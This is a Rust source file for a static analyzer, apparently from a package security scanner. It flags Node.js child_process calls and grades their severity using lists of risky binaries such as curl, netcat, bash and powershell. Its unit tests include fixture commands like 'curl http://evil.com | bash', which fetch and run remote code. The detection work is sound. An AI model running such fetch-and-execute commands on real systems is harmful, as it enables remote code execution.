use aho_corasick::AhoCorasick;
use lazy_static::lazy_static;

use crate::ast::{walk_ast_filtered, ArgInfo, AstVisitor, CallInfo, NodeInterest, VariableMap};
use crate::util::LineIndex;

use super::{FileAnalyzer, FileContext, Issue, Severity};

const CHILD_PROCESS_METHODS: &[&str] =
  &["exec", "execSync", "execFile", "execFileSync", "spawn", "spawnSync", "fork"];

// Binaries that are critical risk - typically used for remote code execution
const CRITICAL_BINARIES: &[&str] = &[
  "curl",
  "wget",
  "nc",
  "netcat",
  "bash",
  "sh",
  "zsh",
  "fish",
  "cmd",
  "cmd.exe",
  "powershell",
  "powershell.exe",
  "pwsh",
  "python",
  "python3",
  "perl",
  "ruby",
  "php",
  "eval",
];

const HIGH_RISK_BINARIES: &[&str] = &[
  "node", "npm", "npx", "yarn", "pnpm", "bun", "deno", "git", "make", "cmake", "cargo", "go",
  "rustc", "gcc", "g++", "clang", "javac", "java",
];

// Binaries that are medium risk - system utilities
const MEDIUM_RISK_BINARIES: &[&str] = &[
  "cp", "mv", "rm", "mkdir", "rmdir", "chmod", "chown", "cat", "echo", "ls", "dir", "find", "grep",
  "sed", "awk", "tar", "gzip", "zip", "unzip", "git",
];

lazy_static! {
  static ref QUICK_CHECK: AhoCorasick = AhoCorasick::new([
    "child_process",
    "require('child_process",
    "require(\"child_process",
    "from 'child_process",
    "from \"child_process",
    "exec(",
    "execSync(",
    "execFile(",
    "execFileSync(",
    "spawn(",
    "spawnSync(",
    "fork(",
    "process.binding(",
  ])
  .unwrap();
}

pub struct ProcessAnalyzer;

struct ProcessVisitor<'a> {
  issues: Vec<Issue>,
  analyzer_name: &'static str,
  file_path: &'a str,
  package_name: Option<&'a str>,
  line_index: LineIndex,
  has_child_process_import: bool,
  variable_map: &'a VariableMap,
  allowed_commands: Vec<String>,
}

impl ProcessVisitor<'_> {
  fn is_command_allowed(&self, cmd: &str) -> bool {
    if self.allowed_commands.is_empty() {
      return false;
    }

    let cmd_lower = cmd.to_lowercase();
    let binary = cmd_lower
      .split(|c: char| c.is_whitespace() || c == '/' || c == '\\')
      .find(|s| !s.is_empty())
      .unwrap_or(&cmd_lower);

    self.allowed_commands.iter().any(|allowed| {
      let allowed_lower = allowed.to_lowercase();
      binary == allowed_lower || binary.ends_with(&allowed_lower)
    })
  }

  fn get_severity_for_command(&self, cmd: &str) -> Severity {
    let cmd_lower = cmd.to_lowercase();

    let binary = cmd_lower
      .split(|c: char| c.is_whitespace() || c == '/' || c == '\\')
      .find(|s| !s.is_empty())
      .unwrap_or(&cmd_lower);

    if CRITICAL_BINARIES.iter().any(|b| binary == *b || binary.ends_with(b)) {
      return Severity::Critical;
    }

    if cmd_lower.contains("://") || cmd_lower.contains(" | ") || cmd_lower.contains("|bash") {
      return Severity::Critical;
    }

    if HIGH_RISK_BINARIES.iter().any(|b| binary == *b || binary.ends_with(b)) {
      return Severity::High;
    }

    if MEDIUM_RISK_BINARIES.contains(&binary) {
      return Severity::Medium;
    }

    Severity::High
  }

  fn resolve_command(&self, args: &[ArgInfo]) -> Option<String> {
    if let Some(first_arg) = args.first() {
      if let Some(resolved) = self.variable_map.resolve_arg(first_arg) {
        return Some(resolved);
      }
      if let ArgInfo::StringLiteral(cmd) = first_arg {
        return Some(cmd.clone());
      }
    }
    None
  }
}

impl AstVisitor for ProcessVisitor<'_> {
  fn visit_call(&mut self, call: &CallInfo) {
    let line = call.line.max(1);

    if let Some(ref callee) = call.callee_name {
      if callee == "require" {
        if let Some(ArgInfo::StringLiteral(module)) = call.arguments.first() {
          if module == "child_process" {
            self.has_child_process_import = true;
          }
        }
      }
    }

    if let (Some(ref callee), Some(ref object)) = (&call.callee_name, &call.object_name) {
      if (object == "child_process" || self.has_child_process_import)
        && CHILD_PROCESS_METHODS.contains(&callee.as_str())
      {
        let resolved_cmd = self.resolve_command(&call.arguments);

        if let Some(ref cmd) = resolved_cmd {
          if self.is_command_allowed(cmd) {
            return;
          }
        }

        let severity = if let Some(ref cmd) = resolved_cmd {
          self.get_severity_for_command(cmd)
        } else {
          Severity::High
        };

        let message = if let Some(ref cmd) = resolved_cmd {
          let binary = cmd
            .split(|c: char| c.is_whitespace() || c == '/' || c == '\\')
            .find(|s| !s.is_empty())
            .unwrap_or(cmd);
          format!("Process `{}` spawning detected via child_process.{}", binary, callee)
        } else {
          format!("Process spawning detected via child_process.{}", callee)
        };

        let mut issue =
          Issue::new(self.analyzer_name, message, severity, self.file_path.to_string())
            .with_line(line)
            .with_code(self.line_index.get_line(line));
        if let Some(pkg) = self.package_name {
          issue = issue.with_package_name(pkg);
        }
        self.issues.push(issue);
      }

      if object == "process" && callee == "binding" {
        if let Some(ArgInfo::StringLiteral(binding)) = call.arguments.first() {
          if binding == "spawn_sync" {
            let message =
              "Low-level process spawning detected via process.binding('spawn_sync')".to_string();

            let mut issue = Issue::new(
              self.analyzer_name,
              message,
              Severity::Critical,
              self.file_path.to_string(),
            )
            .with_line(line)
            .with_code(self.line_index.get_line(line));
            if let Some(pkg) = self.package_name {
              issue = issue.with_package_name(pkg);
            }
            self.issues.push(issue);
          }
        }
      }
    }

    if let Some(ref callee) = call.callee_name {
      if call.object_name.is_none()
        && CHILD_PROCESS_METHODS.contains(&callee.as_str())
        && self.has_child_process_import
      {
        let resolved_cmd = self.resolve_command(&call.arguments);

        // Check if the command is in the allowed list
        if let Some(ref cmd) = resolved_cmd {
          if self.is_command_allowed(cmd) {
            return; // Skip this issue - command is allowed
          }
        }

        let severity = if let Some(ref cmd) = resolved_cmd {
          self.get_severity_for_command(cmd)
        } else {
          Severity::High
        };

        let message = if let Some(ref cmd) = resolved_cmd {
          let binary = cmd
            .split(|c: char| c.is_whitespace() || c == '/' || c == '\\')
            .find(|s| !s.is_empty())
            .unwrap_or(cmd);
          format!("Process `{}` spawning detected via {}", binary, callee)
        } else {
          format!("Process spawning detected via {}", callee)
        };

        let mut issue =
          Issue::new(self.analyzer_name, message, severity, self.file_path.to_string())
            .with_line(line)
            .with_code(self.line_index.get_line(line));
        if let Some(pkg) = self.package_name {
          issue = issue.with_package_name(pkg);
        }
        self.issues.push(issue);
      }
    }
  }
}

impl FileAnalyzer for ProcessAnalyzer {
  fn name(&self) -> &'static str {
    "process"
  }

  fn uses_ast(&self) -> bool {
    true
  }

  fn analyze(&self, context: &FileContext) -> Vec<Issue> {
    if !QUICK_CHECK.is_match(context.source) {
      return vec![];
    }

    let allowed_commands = context
      .config
      .get_analyzer_config("process")
      .and_then(|c| c.allowed_commands.clone())
      .unwrap_or_default();

    let empty_map = VariableMap::default();
    let variable_map = context.parsed_ast.map(|ast| &ast.variable_map).unwrap_or(&empty_map);

    let mut visitor = ProcessVisitor {
      issues: vec![],
      analyzer_name: self.name(),
      file_path: context.file_path.to_str().unwrap_or(""),
      package_name: context.package_name,
      line_index: LineIndex::new(context.source),
      has_child_process_import: false,
      variable_map,
      allowed_commands,
    };

    let interest = NodeInterest::none().with_calls();
    walk_ast_filtered(context.parsed_ast, context.source, &mut visitor, interest);

    for (line_num, line) in context.source.lines().enumerate() {
      if line.contains("shell")
        && line.contains("true")
        && (line.contains("shell: true")
          || line.contains("shell:true")
          || (line.contains("shell") && line.contains("true") && line.contains("{")))
      {
        let message =
          "Process spawning with shell: true detected (command injection risk)".to_string();

        if !visitor.issues.iter().any(|i| i.line == line_num + 1 && i.message == message) {
          let file_path = context.file_path.to_str().unwrap_or("unknown");
          let mut issue = Issue::new(self.name(), message, Severity::High, file_path.to_string())
            .with_line(line_num + 1)
            .with_code(line.trim().to_string());
          if let Some(pkg) = context.package_name {
            issue = issue.with_package_name(pkg);
          }
          visitor.issues.push(issue);
        }
      }
    }

    visitor.issues
  }
}

#[cfg(test)]
mod tests {
  use super::*;
  use std::path::PathBuf;

  #[test]
  fn test_detects_exec() {
    let analyzer = ProcessAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"
const { exec } = require('child_process');
exec('ls -la', callback);
"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
      parsed_ast: None,
    };
    let issues = analyzer.analyze(&context);

    assert!(!issues.is_empty());
    assert!(issues.iter().any(|i| i.message.contains("exec")));
    assert!(issues.iter().any(|i| i.message.contains("`ls`")));
    // ls is a medium risk command
    assert!(issues.iter().any(|i| i.severity == Severity::Medium));
  }

  #[test]
  fn test_detects_spawn() {
    let analyzer = ProcessAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"
const cp = require('child_process');
cp.spawn('node', ['script.js']);
"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
      parsed_ast: None,
    };
    let issues = analyzer.analyze(&context);

    assert!(!issues.is_empty());
    assert!(issues.iter().any(|i| i.message.contains("`node`")));
    assert!(issues.iter().any(|i| i.severity == Severity::High));
  }

  #[test]
  fn test_severity_critical_for_curl() {
    let analyzer = ProcessAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"
const { exec } = require('child_process');
exec('curl http://evil.com', callback);
"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
      parsed_ast: None,
    };
    let issues = analyzer.analyze(&context);

    assert!(!issues.is_empty());
    assert!(issues.iter().any(|i| i.message.contains("`curl`")));
    assert!(issues.iter().any(|i| i.severity == Severity::Critical));
  }

  #[test]
  fn test_severity_critical_for_bash() {
    let analyzer = ProcessAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"
const { spawn } = require('child_process');
spawn('bash', ['-c', 'echo hello']);
"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
      parsed_ast: None,
    };
    let issues = analyzer.analyze(&context);

    assert!(!issues.is_empty());
    assert!(issues.iter().any(|i| i.message.contains("`bash`")));
    assert!(issues.iter().any(|i| i.severity == Severity::Critical));
  }

  #[test]
  fn test_detects_process_binding() {
    let analyzer = ProcessAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"process.binding('spawn_sync');"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
      parsed_ast: None,
    };
    let issues = analyzer.analyze(&context);

    assert_eq!(issues.len(), 1);
    assert_eq!(issues[0].severity, Severity::Critical);
  }

  #[test]
  fn test_detects_shell_true() {
    let analyzer = ProcessAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"spawn('cmd', args, { shell: true });"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
      parsed_ast: None,
    };
    let issues = analyzer.analyze(&context);

    assert!(!issues.is_empty());
    assert!(issues.iter().any(|i| i.message.contains("shell: true")));
  }

  #[test]
  fn test_detects_suspicious_commands() {
    let analyzer = ProcessAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"
const { exec } = require('child_process');
exec('curl http://evil.com | bash');
"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
      parsed_ast: None,
    };
    let issues = analyzer.analyze(&context);

    assert!(!issues.is_empty());
    // curl with pipe is critical
    assert!(issues.iter().any(|i| i.severity == Severity::Critical));
  }

  #[test]
  fn test_ignores_safe_code() {
    let analyzer = ProcessAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"
const fs = require('fs');
fs.readFileSync('package.json');
"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
      parsed_ast: None,
    };
    let issues = analyzer.analyze(&context);

    assert!(issues.is_empty());
  }

  #[test]
  fn test_resolves_command_from_variable() {
    use crate::ast::ParsedAst;

    let analyzer = ProcessAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"
const { exec } = require('child_process');
const cmd = 'curl http://evil.com';
exec(cmd);
"#;

    let parsed_ast = ParsedAst::parse(source).unwrap();
    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
      parsed_ast: Some(&parsed_ast),
    };
    let issues = analyzer.analyze(&context);

    assert!(!issues.is_empty());
    // curl is critical - resolved through variable
    assert!(issues.iter().any(|i| i.severity == Severity::Critical));
  }

  #[test]
  fn test_resolves_command_from_object_property() {
    use crate::ast::ParsedAst;

    let analyzer = ProcessAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"
const { spawn } = require('child_process');
const config = { binary: 'bash' };
spawn(config.binary, ['-c', 'echo hello']);
"#;

    let parsed_ast = ParsedAst::parse(source).unwrap();
    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
      parsed_ast: Some(&parsed_ast),
    };
    let issues = analyzer.analyze(&context);

    assert!(!issues.is_empty());
    // bash is critical - resolved through object property
    assert!(issues.iter().any(|i| i.severity == Severity::Critical));
  }

  #[test]
  fn test_allowed_commands() {
    use crate::ast::ParsedAst;

    let analyzer = ProcessAnalyzer;
    let mut config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    // Configure allowed commands
    let analyzer_config = crate::config::AnalyzerConfig {
      allowed_commands: Some(vec!["git".to_string(), "node".to_string()]),
      ..Default::default()
    };
    config.analyzers.insert("process".to_string(), analyzer_config);

    let source = r#"
const { execSync } = require('child_process');
execSync('git status');
execSync('node --version');
execSync('npm install'); // This should still be detected (not in allowed list)
"#;

    let parsed_ast = ParsedAst::parse(source).unwrap();
    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
      parsed_ast: Some(&parsed_ast),
    };
    let issues = analyzer.analyze(&context);

    // Should only detect npm install, not git or node
    assert_eq!(issues.len(), 1, "Expected 1 issue but got {}: {:?}", issues.len(), issues);
    assert!(
      issues[0].message.contains("spawning"),
      "Expected message to contain 'spawning' but got: {}",
      issues[0].message
    );
    assert!(
      issues[0].message.contains("`npm`"),
      "Expected message to contain '`npm`' but got: {}",
      issues[0].message
    );
  }
}
